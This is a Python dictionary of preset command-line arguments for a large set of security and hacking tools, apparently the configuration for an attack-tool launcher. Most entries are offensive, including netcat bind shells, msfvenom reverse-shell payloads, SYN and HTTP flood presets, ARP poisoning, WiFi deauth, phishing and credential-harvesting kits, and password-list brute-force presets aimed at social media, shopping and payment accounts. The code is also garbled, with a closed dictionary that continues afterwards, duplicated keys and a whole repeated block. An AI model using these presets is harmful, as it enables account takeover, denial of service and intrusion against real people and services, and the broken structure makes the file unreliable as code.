BUILTIN_ARGS = {
    # === EXISTING TOOLS (KEPT) ===
    "nmap": [
        ("-sS", "SYN stealth scan"), ("-sT", "TCP connect scan"), ("-sU", "UDP scan"),
        ("-sV", "Version detection"), ("-sC", "Default scripts"), ("-O", "OS detection"),
        ("-p-", "All ports"), ("-F", "Fast scan"), ("-A", "Aggressive"),
        ("--script vuln", "Vuln scan"), ("-T4", "Speed T4"), ("-Pn", "Skip ping"),
        ("-oN output.txt", "Save output"), ("-v", "Verbose")
    ],
    "hydra": [
        ("-l admin -P wordlist.txt", "Single user"), ("-L users.txt -P pass.txt", "User list"),
        ("ssh://", "SSH"), ("ftp://", "FTP"), ("http-post-form://", "HTTP POST"),
        ("-t 16", "16 threads"), ("-f", "Stop on first")
    ],
    "sqlmap": [
        ("-u", "Target URL"), ("--dbs", "Enumerate DBs"), ("--tables", "Enumerate tables"),
        ("--dump", "Dump data"), ("--batch", "Auto answers"), ("--os-shell", "OS shell"),
        ("--level=5", "Max level"), ("--risk=3", "Max risk")
    ],
    "john": [
        ("--wordlist=rockyou.txt", "Rockyou"), ("--format=raw-md5", "MD5"),
        ("--format=raw-sha256", "SHA256"), ("--incremental", "Incremental"),
        ("--show", "Show cracked")
    ],
    "hashcat": [
        ("-m 0", "MD5"), ("-m 1000", "NTLM"), ("-m 2500", "WPA"),
        ("-a 0", "Dictionary"), ("-a 3", "Brute force"), ("-O", "Optimized")
    ],
    "curl": [
        ("-I", "Headers"), ("-v", "Verbose"), ("-L", "Follow redirects"),
        ("-X POST", "POST"), ("-d 'data'", "Send data"), ("-k", "Insecure SSL")
    ],
    "gobuster": [
        ("dir -u", "Directory mode"), ("dns -d", "DNS mode"),
        ("-w /usr/share/wordlists/dirb/common.txt", "Common list"),
        ("-x php,html,txt", "Extensions"), ("-t 50", "50 threads")
    ],
    "nikto": [
        ("-h", "Target"), ("-ssl", "Force SSL"), ("-Tuning 1", "Files"),
        ("-o report.html", "HTML output")
    ],
    "wpscan": [
        ("--url", "Target URL"), ("--enumerate p", "Plugins"),
        ("--enumerate u", "Users"), ("--password-attack wp-login", "Password attack")
    ],
    "dirb": [
        ("http://target.com", "Target"), ("/usr/share/wordlists/dirb/common.txt", "Common"),
        ("-X .php,.html", "Extensions"), ("-w", "No warnings")
    ],
    "ffuf": [
        ("-u", "URL with FUZZ"), ("-w wordlist.txt", "Wordlist"),
        ("-H 'Host: FUZZ'", "Header fuzz"), ("-t 100", "100 threads"),
        ("-mc 200,301", "Match codes"), ("-fc 404", "Filter 404")
    ],
    "dig": [
        ("A", "IPv4"), ("MX", "Mail"), ("NS", "Nameservers"), ("ANY", "All"),
        ("+short", "Short output")
    ],
    "netcat": [
        ("-lvp 4444", "Listen"), ("-v target 80", "Connect"),
        ("-e /bin/bash", "Shell"), ("-z 1-1000", "Port scan")
    ],
    "tcpdump": [
        ("-i any", "All interfaces"), ("-n", "No DNS"), ("-w capture.pcap", "Save"),
        ("port 80", "HTTP only")
    ],
    "aircrack-ng": [
        ("-w rockyou.txt", "Wordlist"), ("-b", "BSSID"), ("capture.cap", "File")
    ],
    "exiftool": [
        ("image.jpg", "Read"), ("-all=", "Delete all"), ("-json", "JSON output")
    ],
    "binwalk": [
        ("file.bin", "Scan"), ("-e", "Extract"), ("-Me", "Recursive extract")
    ],
    "steghide": [
        ("embed -cf cover.jpg -ef secret.txt", "Embed"),
        ("extract -sf stego.jpg", "Extract")
    ],
    "strings": [
        ("file.bin", "Read"), ("-n 8", "Min length 8")
    ],
    "crunch": [
        ("8 8 -t @@@@%%%%", "Pattern"), ("6 8 0123456789", "Numeric")
    ],
    "msfconsole": [
        ("-q", "Quiet"), ("-x 'use multi/handler; set PAYLOAD; set LHOST; set LPORT; run'", "Handler")
    ],
    "ettercap": [
        ("-T", "Text mode"), ("-M arp:remote", "ARP poison")
    ],
    "whatweb": [
        ("-v", "Verbose"), ("-a 3", "Aggressive")
    ],
    "traceroute": [
        ("-n", "No DNS"), ("-I", "ICMP")
    ],
    "ping": [
        ("-c 4", "4 packets"), ("-f", "Flood")
    ],
    
    # === NEW TOOLS ===
    # STRENGTH CHECKER / HASH GENERATOR / MD5 CRACKER
    "hash-identifier": [
        ("hash.txt", "Identify hash"), ("-h", "Help")
    ],
    "hashid": [
        ("hash", "Identify hash"), ("-m", "Show hashcat mode"), ("-j", "Show john format")
    ],
    "md5sum": [
        ("file.txt", "MD5 file"), ("-c", "Check"), ("-b", "Binary")
    ],
    "sha256sum": [
        ("file.txt", "SHA256 file")
    ],
    "base64": [
        ("file.txt", "Encode"), ("-d file.b64", "Decode"), ("-w 0", "No wrap")
    ],
    
    # PORT SCANNER / DNS RECON / IP INTELLIGENCE / WEB HEADER SCAN
    "masscan": [
        ("-p80,443 192.168.1.0/24", "Web ports"), ("-p1-65535", "All ports"),
        ("--rate=1000", "Rate limit"), ("-oJ output.json", "JSON output")
    ],
    "rustscan": [
        ("-a 192.168.1.1", "Target"), ("-p 1-1000", "Port range"),
        ("--ulimit 5000", "Ulimit"), ("-t 2000", "Timeout")
    ],
    "whois": [
        ("-H", "No legal"), ("-a", "ARIN")
    ],
    "dnsrecon": [
        ("-d domain.com", "Domain"), ("-t axfr", "Zone transfer"),
        ("-t std", "Standard"), ("-D wordlist.txt", "Dictionary")
    ],
    "dnsenum": [
        ("domain.com", "Target"), ("-f wordlist.txt", "Wordlist")
    ],
    
    # LSB STEGANOGRAPHY / METADATA EXTRACTOR
    "zsteg": [
        ("image.png", "Analyze"), ("-a", "All methods"), ("-E file.txt", "Extract")
    ],
    "stegsolve": [
        ("image.png", "Analyze")
    ],
    "stegcracker": [
        ("stego.jpg wordlist.txt", "Crack"), ("-o output.txt", "Output")
    ],
    "foremost": [
        ("-i file.dd", "Input"), ("-o output/", "Output"), ("-t all", "All types")
    ],
    "bulk_extractor": [
        ("-o output/", "Output"), ("image.dd", "Input"), ("-e all", "All extractors")
    ],
    
    # CUSTOMIZABLE BRUTE FORCE / PHISHING DETECTOR / MALWARE SANDBOX
    "hydra": [
        ("-l admin -P pass.txt ssh://target", "SSH brute"),
        ("-L users.txt -P pass.txt ftp://target", "FTP brute"),
        ("-l admin -P pass.txt http-post-form://target/login:user=^USER^&pass=^PASS^:F=incorrect", "HTTP form"),
    ],
    "medusa": [
        ("-h target -u admin -P pass.txt -M ssh", "SSH"),
        ("-h target -U users.txt -P pass.txt -M ftp", "FTP"),
        ("-h target -u admin -P pass.txt -M http", "HTTP")
    ],
    "ncrack": [
        ("-p 22 --user admin -P pass.txt target", "SSH"),
        ("-p 21 --user admin -P pass.txt target", "FTP"),
        ("-p 3389 --user admin -P pass.txt target", "RDP")
    ],
    "patator": [
        ("ssh_login host=target user=admin password=FILE0 0=pass.txt", "SSH"),
        ("ftp_login host=target user=admin password=FILE0 0=pass.txt", "FTP")
    ],
    
    # SECURE FILE SHREDDER (MULTI-PASS)
    "shred": [
        ("-n 7 file.txt", "7 passes"), ("-z file.txt", "Zero final"),
        ("-u file.txt", "Remove after"), ("-v file.txt", "Verbose")
    ],
    "wipe": [
        ("-f file.txt", "Force"), ("-r directory/", "Recursive"),
        ("-q", "Quick")
    ],
    "dd": [
        ("if=/dev/urandom of=file bs=1M count=10", "Random overwrite"),
        ("if=/dev/zero of=file bs=1M count=10", "Zero overwrite")
    ],
    "srm": [
        ("-v file.txt", "Verbose"), ("-r directory/", "Recursive"),
        ("-l", "Lessen"), ("-f", "Fast")
    ],
    
    # DoS TOOLS
    "hping3": [
        ("-S target -p 80 --flood", "SYN flood"), ("-S target -p 443 --flood", "HTTPS flood"),
        ("--udp target -p 53 --flood", "UDP flood"), ("-1 target --flood", "ICMP flood"),
        ("-S target -p 80 --rand-source", "Random source")
    ],
    "slowloris": [
        ("-p 80 target", "HTTP slow"), ("-p 443 target --https", "HTTPS slow"),
        ("-s 500", "500 sockets"), ("--sleeptime 10", "Sleep time")
    ],
    "goldeneye": [
        ("target -w 100 -s 200", "100 workers"), ("target -w 500", "500 workers"),
        ("-m random", "Random method")
    ],
    "ab": [
        ("-n 1000 -c 10 http://target/", "1000 requests"),
        ("-n 10000 -c 100 http://target/", "10K requests"),
        ("-t 30 -c 10 http://target/", "30 second test")
    ],
    "siege": [
        ("-c 100 -t 30s http://target", "100 users 30s"),
        ("-c 200 -r 50 http://target", "200 users 50 reps"),
        ("-f urls.txt", "URL file")
    ],
    
    # ADDITIONAL SECURITY TOOLS
    "lynis": [
        ("audit system", "System audit"), ("--quick", "Quick scan"),
        ("--pentest", "Pentest mode")
    ],
    "chkrootkit": [
        ("-q", "Quiet"), ("-x", "Expert")
    ],
    "rkhunter": [
        ("--check", "Check"), ("--update", "Update"), ("--sk", "Skip keypress")
    ],
    "clamscan": [
        ("-r /", "Scan root"), ("-r --bell", "Alert"), ("--remove", "Remove malware")
    ],
    "testssl.sh": [
        ("https://target.com", "Full test"), ("--each-cipher", "Each cipher"),
        ("--json", "JSON output")
    ],
    "sslscan": [
        ("target:443", "Target"), ("--no-failed", "No failed"), ("--xml=out.xml", "XML")
    ],
    "sslyze": [
        ("--regular target.com", "Regular scan"), ("--json_out out.json", "JSON")
    ],


    # === SOCIAL MEDIA BRUTE FORCE ===
    "sherlock": [
        ("username", "Search username"), ("--output results/", "Output folder"),
        ("--csv", "CSV output"), ("--xlsx", "XLSX output"),
        ("--site twitter", "Twitter only"), ("--site instagram", "Instagram only"),
        ("--site facebook", "Facebook only"), ("--site all", "All 300+ sites"),
        ("--timeout 5", "5s timeout"), ("-t 20", "20 threads"),
        ("--print-found", "Print found only"), ("--nsfw", "Include NSFW"),
    ],
    "holehe": [
        ("email@test.com", "Check email"), ("--only-used", "Only registered"),
        ("-o output.csv", "CSV output"), ("-p", "Print results"),
    ],
    "instashell": [
        ("-u username", "Target user"), ("-p password", "Single password"),
        ("-f list.txt", "Password list"), ("-t 10", "10 threads"),
        ("--proxy 127.0.0.1:8080", "Use proxy"),
    ],
    "instagram-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "facebook-brute": [
        ("-u user@email.com", "Email/ID"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "twitter-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "tiktok-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "snapchat-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "linkedin-brute": [
        ("-u email@test.com", "Target email"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "github-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "reddit-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "pinterest-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "tumblr-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "spotify-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "netflix-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "hulu-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "amazon-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "paypal-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 3", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "ebay-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "wordpress-brute": [
        ("--url http://target.com", "Target URL"), ("--usernames admin", "Single user"),
        ("-U users.txt", "User list"), ("-P pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "joomla-brute": [
        ("-u http://target.com", "Target URL"), ("-w admin", "Username"),
        ("-p pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "drupal-brute": [
        ("-u http://target.com", "Target URL"), ("-U users.txt", "User list"),
        ("-P pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "magento-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],
    "prestashop-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],

}
    # === SOCIAL MEDIA & PHISHING TOOLS ===
    "setoolkit": [
        ("-s", "Social engineering attacks"), ("-p", "Phishing attack vectors"),
        ("-w", "Website attack vectors"), ("-q", "Quick track"),
        ("-m", "Mass mailer"), ("-c", "Credential harvester"),
        ("-t", "Tabnabbing"), ("-j", "Java applet attack")
    ],
    "socialfish": [
        ("-u", "Update"), ("-c", "Check credentials"), ("-r", "Run server"),
        ("-p 8080", "Port 8080"), ("--ssl", "Enable SSL")
    ],
    "zphisher": [
        ("-p", "Pick page"), ("-t", "Tunnel option"), ("-o", "Open port"),
        ("-l", "Localhost"), ("--ngrok", "Ngrok tunnel")
    ],
    "blackeye": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server")
    ],
    "sherlock": [
        ("username", "Search username"), ("-o output/", "Output folder"),
        ("--csv", "CSV output"), ("--xlsx", "XLSX output"),
        ("--site twitter", "Twitter only"), ("--site instagram", "Instagram only"),
        ("--site facebook", "Facebook only"), ("--site all", "All sites"),
        ("-t 10", "10 threads"), ("--timeout 5", "5s timeout")
    ],
    "holehe": [
        ("email@example.com", "Check email"), ("-o output.csv", "CSV output"),
        ("--only-used", "Only used"), ("-p", "Print results")
    ],
    "instashell": [
        ("-u username", "Target user"), ("-p password", "Password"),
        ("-f list.txt", "Password list"), ("-t 10", "10 threads")
    ],
    "instaloader": [
        ("username", "Download profile"), ("--login YOUR_USER", "Login"),
        ("--stories", "Download stories"), ("--highlights", "Download highlights"),
        ("--tagged", "Tagged posts"), ("--igtv", "IGTV videos")
    ],
    "twint": [
        ("-u username", "User tweets"), ("-s search_term", "Search"),
        ("--since 2020-01-01", "Since date"), ("--csv", "CSV output"),
        ("-o output.json", "JSON output")
    ],
    "tweepy": [
        ("-u username", "User info"), ("-f followers", "Get followers"),
        ("-t timeline", "User timeline"), ("-s search", "Search tweets")
    ],
    "facebook-scraper": [
        ("-u profile_url", "Profile URL"), ("-p page_url", "Page URL"),
        ("-g group_url", "Group URL"), ("--posts 20", "20 posts"),
        ("--comments", "Get comments"), ("--likes", "Get likes")
    ],
    "tiktok-scraper": [
        ("-u username", "User"), ("-t hashtag", "Hashtag"),
        ("-n 50", "50 videos"), ("--download", "Download videos")
    ],
    "puppeteer": [
        ("-u URL", "Target URL"), ("-s screenshot.png", "Screenshot"),
        ("-p proxy:8080", "Proxy"), ("--headless", "Headless mode")
    ],
    
    # === PHISHING FRAMEWORKS ===
    "gophish": [
        ("--port 3333", "Admin port"), ("--config config.json", "Config file"),
        ("-v", "Verbose")
    ],
    "king-phisher": [
        ("--server", "Start server"), ("--config config.yml", "Config"),
        ("--debug", "Debug mode")
    ],
    "phishing-frenzy": [
        ("-s", "Start server"), ("-p 3000", "Port 3000"),
        ("-e production", "Environment")
    ],
    "evilginx2": [
        ("-p phishlet", "Phishlet name"), ("-t target.com", "Target"),
        ("-g group", "Phishlet group"), ("--debug", "Debug")
    ],
    "modlishka": [
        ("-config config.json", "Config"), ("-proxy target.com", "Proxy target"),
        ("-listeningAddress 0.0.0.0", "Listen"), ("-port 443", "Port")
    ],
    "muraena": [
        ("-config config.toml", "Config"), ("-phish phish.toml", "Phish config"),
        ("-t target.com", "Target domain"), ("-v", "Verbose")
    ],
    
    # === CREDENTIAL HARVESTING ===
    "credmap": [
        ("-u target.com", "Target URL"), ("-f login_form", "Login form"),
        ("-o output.txt", "Output"), ("-t 10", "Threads")
    ],
    "creds.py": [
        ("-u URL", "Target URL"), ("-p payload.txt", "Payload list"),
        ("-o output.txt", "Output file"), ("--proxy 127.0.0.1:8080", "Proxy")
    ],
    "pwned": [
        ("-e email@test.com", "Check email"), ("-d domain.com", "Check domain"),
        ("-o output.json", "JSON output")
    ],
    
    # === OSINT / RECON ===
    "theHarvester": [
        ("-d domain.com -b google", "Google search"), ("-d domain.com -b all", "All sources"),
        ("-d domain.com -b linkedin", "LinkedIn"), ("-f output.html", "HTML output"),
        ("-c", "DNS brute"), ("-n", "DNS lookup")
    ],
    "recon-ng": [
        ("-m module_name", "Module"), ("-w workspace", "Workspace"),
        ("--no-version", "No version check"), ("--verbose", "Verbose")
    ],
    "spiderfoot": [
        ("-s target.com", "Target"), ("-l 127.0.0.1:5001", "Web interface"),
        ("-m all", "All modules"), ("-t passive", "Passive only")
    ],
    "osrframework": [
        ("-u username", "Username search"), ("-e email@test.com", "Email search"),
        ("-p phone_number", "Phone lookup"), ("-d domain.com", "Domain search")
    ],
    "maltego": [
        ("-g graph.mtz", "Open graph"), ("-i import.csv", "Import data"),
        ("-t transform", "Run transform")
    ],
    
    # === WIFI HACKING ===
    "bettercap": [
        ("-iface wlan0", "Interface"), ("-caplet http-ui", "Web UI"),
        ("-eval 'net.probe on'", "Network probe"), ("-eval 'wifi.recon on'", "WiFi recon"),
        ("-eval 'wifi.deauth *'", "Deauth attack"), ("-eval 'net.sniff on'", "Packet sniff")
    ],
    "wireshark": [
        ("-i wlan0", "Interface"), ("-k", "Start capture"), ("-r capture.pcap", "Read file"),
        ("-Y 'http'", "Filter HTTP"), ("-Y 'dns'", "Filter DNS")
    ],
    "kismet": [
        ("-c wlan0", "Interface"), ("--no-server", "No web server"),
        ("--daemonize", "Background mode")
    ],
    "fluxion": [
        ("-i wlan0", "Interface"), ("-e 'WiFi Name'", "Target ESSID"),
        ("-c 6", "Channel 6"), ("-a", "Auto mode")
    ],
    "wifite": [
        ("-i wlan0", "Interface"), ("--wpa", "WPA only"), ("--wep", "WEP only"),
        ("--kill", "Kill processes"), ("--dict wordlist.txt", "Wordlist")
    ],
    "pixiewps": [
        ("-e pke -s ehash1 -z ehash2 -a authkey -n ehash2", "Crack WPS"),
        ("-f", "Force"), ("-v 3", "Verbose")
    ],
    "reaver": [
        ("-i wlan0 -b BSSID", "Target"), ("-vv", "Very verbose"),
        ("-c 6", "Channel"), ("-N", "No nacks"), ("-d 2", "Delay")
    ],
    
    # === WEB EXPLOITATION ===
    "burpsuite": [
        ("--project=project.burp", "Open project"), ("--config=config.json", "Config"),
        ("--collaborator-server", "Start collaborator"), ("--unpause-spidering", "Spider")
    ],
    "zap": [
        ("-cmd", "Command line"), ("-daemon", "Daemon mode"),
        ("-port 8080", "Port"), ("-config api.key=KEY", "API key")
    ],
    "commix": [
        ("-u URL", "Target URL"), ("--data 'cmd=id'", "POST data"),
        ("--os=unix", "Unix target"), ("--os=windows", "Windows target"),
        ("--technique=t", "Time-based"), ("--technique=e", "Error-based")
    ],
    "xsser": [
        ("-u URL", "Target URL"), ("--auto", "Auto mode"), ("--Fp", "Final payload"),
        ("--Fr", "Final remote"), ("--D", "Delay"), ("--threads 5", "5 threads"),
        ("-p 'param1,param2'", "Parameters"), ("--Coo='cookie'", "Cookie")
    ],
    "xsstrike": [
        ("-u URL", "Target URL"), ("--data 'param=value'", "POST data"),
        ("--fuzzer", "Fuzzer mode"), ("--crawl", "Crawl site"), ("--blind", "Blind XSS"),
        ("-t 10", "10 threads"), ("--json", "JSON output")
    ],
    "nosqlmap": [
        ("-u URL", "Target URL"), ("--mongodb", "MongoDB"), ("--couchdb", "CouchDB"),
        ("--dump", "Dump data"), ("--enum-databases", "Enum databases")
    ],
    
    # === ANDROID HACKING ===
    "msfvenom": [
        ("-p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk", "Android payload"),
        ("-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe", "Windows payload"),
        ("-l payloads", "List payloads"), ("--list formats", "List formats")
    ],
    "apktool": [
        ("d app.apk", "Decompile"), ("b app/", "Build"), ("-f", "Force"),
        ("-o output.apk", "Output file")
    ],
    "jadx": [
        ("app.apk", "Decompile"), ("-d output/", "Output dir"), ("--deobf", "Deobfuscate")
    ],
    "dex2jar": [
        ("classes.dex", "Convert DEX"), ("-o output.jar", "Output JAR")
    ],
    "androguard": [
        ("analyze app.apk", "Analyze"), ("-o output/", "Output"), ("-v", "Verbose")
    ],
    
    # === BLUETOOTH HACKING ===
    "bluetoothctl": [
        ("scan on", "Scan devices"), ("pair MAC", "Pair device"),
        ("connect MAC", "Connect"), ("info MAC", "Device info")
    ],
    "hcitool": [
        ("scan", "Scan devices"), ("info MAC", "Device info"),
        ("name MAC", "Device name"), ("inq", "Inquiry")
    ],
    "blueranger": [
        ("-i hci0", "Interface"), ("-t MAC", "Target"), ("-r", "Range test")
    ],
    "bluesnarfer": [
        ("-b MAC", "Target"), ("-C 6", "Channel"), ("-i hci0", "Interface")
    ],
    
    # === VOIP HACKING ===
    "sipvicious": [
        ("-p 5060 target.com", "SIP scan"), ("-e 100-200 target.com", "Extension scan"),
        ("-m invite target.com", "Method scan")
    ],
    "voiphopper": [
        ("-i eth0", "Interface"), ("-c 1", "VLAN 1"), ("-m", "MAC spoof")
    ],


    # === SOCIAL MEDIA BRUTE FORCE ===
    "sherlock": [
        ("username", "Search username"), ("--output results/", "Output folder"),
        ("--csv", "CSV output"), ("--xlsx", "XLSX output"),
        ("--site twitter", "Twitter only"), ("--site instagram", "Instagram only"),
        ("--site facebook", "Facebook only"), ("--site all", "All 300+ sites"),
        ("--timeout 5", "5s timeout"), ("-t 20", "20 threads"),
        ("--print-found", "Print found only"), ("--nsfw", "Include NSFW"),
    ],
    "holehe": [
        ("email@test.com", "Check email"), ("--only-used", "Only registered"),
        ("-o output.csv", "CSV output"), ("-p", "Print results"),
    ],
    "instashell": [
        ("-u username", "Target user"), ("-p password", "Single password"),
        ("-f list.txt", "Password list"), ("-t 10", "10 threads"),
        ("--proxy 127.0.0.1:8080", "Use proxy"),
    ],
    "instagram-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "facebook-brute": [
        ("-u user@email.com", "Email/ID"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "twitter-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "tiktok-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "snapchat-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "linkedin-brute": [
        ("-u email@test.com", "Target email"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "github-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "reddit-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "pinterest-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "tumblr-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "spotify-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "netflix-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "hulu-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "amazon-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "paypal-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 3", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "ebay-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "wordpress-brute": [
        ("--url http://target.com", "Target URL"), ("--usernames admin", "Single user"),
        ("-U users.txt", "User list"), ("-P pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "joomla-brute": [
        ("-u http://target.com", "Target URL"), ("-w admin", "Username"),
        ("-p pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "drupal-brute": [
        ("-u http://target.com", "Target URL"), ("-U users.txt", "User list"),
        ("-P pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "magento-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],
    "prestashop-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],

}
